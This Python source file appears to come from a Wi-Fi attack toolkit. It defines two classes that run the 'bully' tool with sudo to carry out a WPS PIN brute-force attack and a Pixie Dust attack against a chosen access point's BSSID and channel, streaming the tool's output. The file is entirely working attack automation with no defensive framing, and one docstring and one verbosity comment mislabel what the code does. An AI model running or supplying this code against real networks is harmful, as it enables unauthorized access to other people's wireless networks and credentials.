import sys
from Model.Attacks.AbstractAttack import AbstractAttack
import subprocess as sb

class WPSBruteForceAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'WPS Brute Force'

    @classmethod
    def execute_attack(cls, **kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['sudo',
            'bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-v', '4'] #verbose lvl 2

        result = sb.Popen(cmd, stdout=sb.PIPE, bufsize=1, universal_newlines=True)

        for l in iter(result.stdout.readline, ""):
            yield l

        result.stdout.close()
        return_code = result.wait()

        if return_code:
            raise sb.CalledProcessError(return_code, cmd)

class PixieDustAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'Pixie Dust'

    @classmethod
    def execute_attack(cls, **kwargs):
        '''
        Attempts to get the password via WPS pixie dust with bully tool.
        '''
        cmd = ['sudo',
            'bully',
            kwargs['interface'].monitor,
            '-b', kwargs['target'].bssid,
            '--channel', str(kwargs['target'].channel), 
            '-d', #pixie dust
            '-v', '2'] #verbose lvl 2

        result = sb.Popen(cmd, stdout=sb.PIPE,  universal_newlines=True)

        for l in iter(result.stdout.readline, ""):
            #if "[Pixie-Dust] WPS pin not found" in l: 
            yield l

        result.stdout.close()
        return_code = result.wait()

        if return_code:
            raise sb.CalledProcessError(return_code, cmd)
